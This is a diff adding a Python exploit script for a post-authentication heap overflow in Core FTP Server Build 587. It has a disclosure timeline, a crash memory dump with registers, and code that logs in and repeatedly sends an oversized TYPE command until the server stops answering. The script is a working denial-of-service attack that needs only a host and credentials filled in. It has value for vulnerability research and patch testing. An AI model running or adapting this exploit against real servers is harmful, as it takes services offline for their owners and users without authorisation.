@@ -1,0 +1,122 @@
+# -*- coding: cp1252 -*-
+# Exploit Title: Core FTP Server 32-bit - Build 587 Heap Overflow
+# Date: 05/10/2016
+# Exploit Author: Paul Purcell
+# Contact: ptpxploit at gmail
+# Vendor Homepage: http://www.coreftp.com/
+# Vulnerable Version Download:  http://coreftp.com/server/download/archive/CoreFTPServer587.exe
+# Version: Core FTP Server 32-bit - Build 587 32-bit
+# Tested on: Windows XP SP3 x32 English, Windows 7 Pro x64 SP1 English, Windows 10 Pro x64 English
+# Category: Remote Heap Overflow PoC
+#
+# Timeline: 03/03/16 Bug found
+#           03/04/16 Vender notified
+#           03/06/16 Vender replied acknowledging the issue
+#           04/07/16 Vender releases Build 588 which fixes the issue.
+#           05/10/16 Exploit Released
+#
+# Summary:  This exploit allows for a post authentication DOS.  The server does not do proper bounds checking on
+#           server responses.  In this case, the long 'MODE set to ...' reply invoked by a long TYPE command
+#           causes a heap overflow and crashes the server process.
+#
+#           Crash info:
+#
+#           0133FA2C  32 30 30 20 4D 4F 44 45  200 MODE
+#           0133FA34  20 73 65 74 20 74 6F 20   set to
+#           0133FA3C  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA44  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA4C  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA54  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA5C  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA64  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA6C  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA74  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA7C  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA84  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA8C  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA94  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FA9C  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAA4  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAAC  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAB4  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FABC  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAC4  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FACC  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAD4  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FADC  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAE4  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAEC  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAF4  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FAFC  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FB04  41 41 41 41 41 41 41 41  AAAAAAAA
+#           0133FB0C  58 02 00 00 8E EB 31 57  X..Žë1W
+#
+#           00439827   . 8B86 3C040000  MOV EAX,DWORD PTR DS:[ESI+43C]           ;  ESI invalid address: DS:[4141457D]=???
+#           0043982D   . 85C0           TEST EAX,EAX
+#
+#           DS:[4141457D]=???
+#           EAX=00000000
+#
+#           EAX 00000000
+#           ECX 00000000
+#           EDX 00000001
+#           EBX 01141B90
+#           ESP 0142C06C
+#           EBP 0143FB3C
+#           ESI 41414141
+#           EDI 00000000
+#           EIP 00439827 coresrvr.00439827
+#           C 1  ES 0023 32bit 0(FFFFFFFF)
+#           P 1  CS 001B 32bit 0(FFFFFFFF)
+#           A 1  SS 0023 32bit 0(FFFFFFFF)
+#           Z 0  DS 0023 32bit 0(FFFFFFFF)
+#           S 1  FS 003B 32bit 7FFD8000(FFF)
+#           T 1  GS 0000 NULL
+#           D 0
+#           O 0  LastErr ERROR_SUCCESS (00000000)
+#           EFL 00000397 (NO,B,NE,BE,S,PE,L,LE)
+#           ST0 empty
+#           ST1 empty
+#           ST2 empty
+#           ST3 empty
+#           ST4 empty
+#           ST5 empty
+#           ST6 empty
+#           ST7 empty
+#                          3 2 1 0      E S P U O Z D I
+#           FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+#           FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+import time
+import socket
+from ftplib import FTP
+
+host='yourhost'             #host or IP
+port=21                     #port
+u="youruser"                #username
+p="yourpass"                #password
+pause=3                     #pause between login & command attempts, normally 3 seconds is plenty of time.
+command="TYPE "
+evil="A"*211                #Any more, and the program warns of buffer overflow attempt and ignores the command
+evilTYPE=(command+evil)     #Evil type command
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+open = sock.connect_ex((host,port))
+sock.close()
+
+if (open == 0):
+    print "FTP is up, lets fix that..."
+    while (open != 10061):
+        print "Connecting to send evil TYPE command..."
+        ftp = FTP()
+        ftp.connect(host,port)
+        ftp.login(u,p)
+        ftp.sendcmd(evilTYPE)
+        ftp.close()
+        time.sleep(pause)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        open = sock.connect_ex((host,port))
+        sock.close()
+    print "No more files for you!"
+else:
+    print "Port "+str(port)+" does not seem to be open on "+host
